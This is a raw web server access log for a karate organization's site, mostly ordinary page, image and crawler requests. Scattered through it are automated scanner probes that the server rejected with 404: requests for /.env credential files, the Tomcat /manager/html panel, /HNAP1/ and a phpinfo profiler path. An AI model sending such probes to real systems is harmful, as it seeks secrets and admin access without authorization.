::ffff:66.249.75.223 - - [03/Oct/2022:16:47:22 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.75.204 - - [03/Oct/2022:16:47:23 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:40.88.21.235 - - [03/Oct/2022:16:56:05 +0000] "GET / HTTP/1.1" 200 58140 "http://wadokikai.org/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
::ffff:40.88.21.235 - - [03/Oct/2022:16:56:06 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.org/images/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
::ffff:66.249.75.216 - - [03/Oct/2022:16:58:06 +0000] "GET /docs/TwentyGuidingPriciplesOfKarate.pdf HTTP/1.1" 404 178 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
::ffff:66.240.236.116 - - [03/Oct/2022:16:58:27 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:157.55.39.137 - - [03/Oct/2022:17:01:25 +0000] "GET /images/schools/marinkaratedo.jpeg HTTP/1.1" 200 104735 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:52.141.30.202 - - [03/Oct/2022:17:04:59 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:52.141.30.202 - - [03/Oct/2022:17:05:00 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:52.141.30.202 - - [03/Oct/2022:17:05:01 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:52.141.30.202 - - [03/Oct/2022:17:05:02 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/promotions/AFSPrelimSchedule.pdf HTTP/1.1" 200 57396 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET / HTTP/1.1" 200 58140 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:14 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:17 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 200 35066 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:21 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:192.241.221.77 - - [03/Oct/2022:17:14:35 +0000] "GET /manager/html HTTP/1.1" 404 151 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:73.231.249.115 - - [03/Oct/2022:17:14:48 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://www.wadokikai.net/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:157.55.39.207 - - [03/Oct/2022:17:16:30 +0000] "GET /joinemail?type=promotions HTTP/1.1" 200 8841 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:135.125.246.189 - - [03/Oct/2022:17:19:32 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [03/Oct/2022:17:19:33 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:19:39 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:19:43 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:216.244.66.196 - - [03/Oct/2022:17:20:19 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:216.244.66.196 - - [03/Oct/2022:17:22:32 +0000] "GET /instructors.html HTTP/1.1" 404 155 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:4.53.139.193 - - [03/Oct/2022:17:24:35 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:24:39 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:30:52 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:30:56 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:185.191.171.2 - - [03/Oct/2022:17:31:22 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:185.191.171.39 - - [03/Oct/2022:17:31:23 +0000] "GET /joinemail HTTP/1.1" 200 8629 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:40.77.167.70 - - [03/Oct/2022:17:34:22 +0000] "GET /images/shuri-lineage.jpg HTTP/1.1" 200 120427 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:4.53.139.193 - - [03/Oct/2022:17:38:25 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:38:29 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:206.189.132.238 - - [03/Oct/2022:17:39:25 +0000] "GET /ab2g HTTP/1.1" 404 143 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:206.189.132.238 - - [03/Oct/2022:17:39:26 +0000] "GET /ab2h HTTP/1.1" 404 143 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:206.189.132.238 - - [03/Oct/2022:17:39:32 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:157.55.39.61 - - [03/Oct/2022:17:50:08 +0000] "GET /images/instructors/amastroianni.jpg HTTP/1.1" 200 78389 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:185.191.171.16 - - [03/Oct/2022:17:54:16 +0000] "GET /joinemail HTTP/1.1" 200 8629 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:154.21.97.170 - - [03/Oct/2022:17:56:52 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:154.21.97.170 - - [03/Oct/2022:17:56:52 +0000] "GET /contact?s=1&ss=5 HTTP/1.1" 200 9997 "http://www.wadokikai.net/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:154.21.97.170 - - [03/Oct/2022:17:56:53 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "http://www.wadokikai.net/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:154.21.97.170 - - [03/Oct/2022:17:56:53 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "http://www.wadokikai.net/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:154.21.97.170 - - [03/Oct/2022:17:56:54 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "http://www.wadokikai.net/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:154.21.97.170 - - [03/Oct/2022:17:56:54 +0000] "GET /contact?s=1&ss=9 HTTP/1.1" 200 9997 "http://www.wadokikai.net/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:154.21.97.170 - - [03/Oct/2022:17:56:55 +0000] "GET /contact?s=1&ss=8 HTTP/1.1" 200 9997 "http://www.wadokikai.net/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:154.21.97.170 - - [03/Oct/2022:17:56:56 +0000] "GET /contact?s=1&ss=7 HTTP/1.1" 200 9997 "http://www.wadokikai.net/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:154.21.97.170 - - [03/Oct/2022:17:56:56 +0000] "GET /contact?s=1&ss=1 HTTP/1.1" 200 9997 "http://www.wadokikai.net/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:154.21.97.170 - - [03/Oct/2022:17:56:57 +0000] "GET /contact?s=1&ss=0 HTTP/1.1" 200 9997 "http://www.wadokikai.net/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:154.21.97.170 - - [03/Oct/2022:17:56:57 +0000] "GET /contact HTTP/1.1" 200 10017 "http://www.wadokikai.net/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:154.21.97.170 - - [03/Oct/2022:17:57:00 +0000] "POST /sendemail HTTP/1.1" 302 96 "http://www.wadokikai.net/contact?s=1&ss=7" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:154.21.97.170 - - [03/Oct/2022:17:57:00 +0000] "GET /contact/?msg=sent&s=1 HTTP/1.1" 200 10400 "http://www.wadokikai.net/sendemail" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:95.214.235.205 - - [03/Oct/2022:18:13:48 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [03/Oct/2022:18:13:49 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:98.45.120.177 - - [03/Oct/2022:18:17:30 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://wadokikai.net/" "Mozilla/5.0 (Linux; Android 9; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.45.120.177 - - [03/Oct/2022:18:17:30 +0000] "GET /js/common.js HTTP/1.1" 304 - "http://wadokikai.net/" "Mozilla/5.0 (Linux; Android 9; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.45.120.177 - - [03/Oct/2022:18:17:30 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "http://wadokikai.net/" "Mozilla/5.0 (Linux; Android 9; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.45.120.177 - - [03/Oct/2022:18:17:30 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.net/" "Mozilla/5.0 (Linux; Android 9; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.45.120.177 - - [03/Oct/2022:18:17:30 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.net/" "Mozilla/5.0 (Linux; Android 9; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.45.120.177 - - [03/Oct/2022:18:17:30 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.net/" "Mozilla/5.0 (Linux; Android 9; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.45.120.177 - - [03/Oct/2022:18:17:30 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.net/" "Mozilla/5.0 (Linux; Android 9; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.45.120.177 - - [03/Oct/2022:18:17:30 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.net/" "Mozilla/5.0 (Linux; Android 9; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.45.120.177 - - [03/Oct/2022:18:17:30 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.net/" "Mozilla/5.0 (Linux; Android 9; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.45.120.177 - - [03/Oct/2022:18:17:30 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.net/" "Mozilla/5.0 (Linux; Android 9; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.45.120.177 - - [03/Oct/2022:18:17:31 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.net/" "Mozilla/5.0 (Linux; Android 9; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.45.120.177 - - [03/Oct/2022:18:17:31 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.net/" "Mozilla/5.0 (Linux; Android 9; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.45.120.177 - - [03/Oct/2022:18:17:31 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.net/" "Mozilla/5.0 (Linux; Android 9; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.45.120.177 - - [03/Oct/2022:18:17:31 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.net/" "Mozilla/5.0 (Linux; Android 9; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.45.120.177 - - [03/Oct/2022:18:17:35 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.net/" "Mozilla/5.0 (Linux; Android 9; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.45.120.177 - - [03/Oct/2022:18:17:39 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://wadokikai.net/" "Mozilla/5.0 (Linux; Android 9; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.45.120.177 - - [03/Oct/2022:18:18:14 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.net/" "Mozilla/5.0 (Linux; Android 9; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.45.120.177 - - [03/Oct/2022:18:18:18 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://wadokikai.net/" "Mozilla/5.0 (Linux; Android 9; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.45.120.177 - - [03/Oct/2022:18:19:14 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.net/" "Mozilla/5.0 (Linux; Android 9; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.45.120.177 - - [03/Oct/2022:18:19:18 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://wadokikai.net/" "Mozilla/5.0 (Linux; Android 9; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.45.120.177 - - [03/Oct/2022:18:21:14 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.net/" "Mozilla/5.0 (Linux; Android 9; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:98.45.120.177 - - [03/Oct/2022:18:21:18 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://wadokikai.net/" "Mozilla/5.0 (Linux; Android 9; SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:40.77.167.105 - - [03/Oct/2022:18:35:35 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:207.46.13.200 - - [03/Oct/2022:18:35:44 +0000] "GET /contact.html HTTP/1.1" 404 151 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:135.125.246.189 - - [03/Oct/2022:18:42:49 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [03/Oct/2022:18:42:49 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:159.223.79.20 - - [03/Oct/2022:18:50:12 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:54.36.148.118 - - [03/Oct/2022:18:59:10 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:135.125.246.189 - - [03/Oct/2022:19:05:35 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [03/Oct/2022:19:05:35 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:182.121.11.206 - - [03/Oct/2022:19:06:27 +0000] "POST /HNAP1/ HTTP/1.0" - - "-" "-"
::ffff:80.76.51.246 - - [03/Oct/2022:19:13:10 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:80.76.51.246 - - [03/Oct/2022:19:13:11 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
